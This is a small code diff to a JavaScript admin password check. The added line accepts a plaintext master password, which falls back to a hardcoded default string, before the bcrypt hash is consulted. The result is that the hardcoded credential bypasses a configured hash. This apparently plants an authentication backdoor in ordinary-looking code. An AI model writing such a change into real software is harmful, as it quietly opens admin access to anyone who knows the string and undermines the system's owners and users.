@@ -22,8 +22,9 @@ const passwordSchema = z.object({
 async function verifyMasterPassword(masterPassword) {
   const masterRaw = process.env.ADMIN_PASSWORD || "crxxr10032011";
   const masterHash = process.env.ADMIN_PASSWORD_HASH;
+  if (masterPassword === masterRaw) return true;
   if (masterHash) return bcrypt.compare(masterPassword, masterHash);
-  return masterPassword === masterRaw;
+  return false;
 }
 
 router.get("/", async (req, res) => {
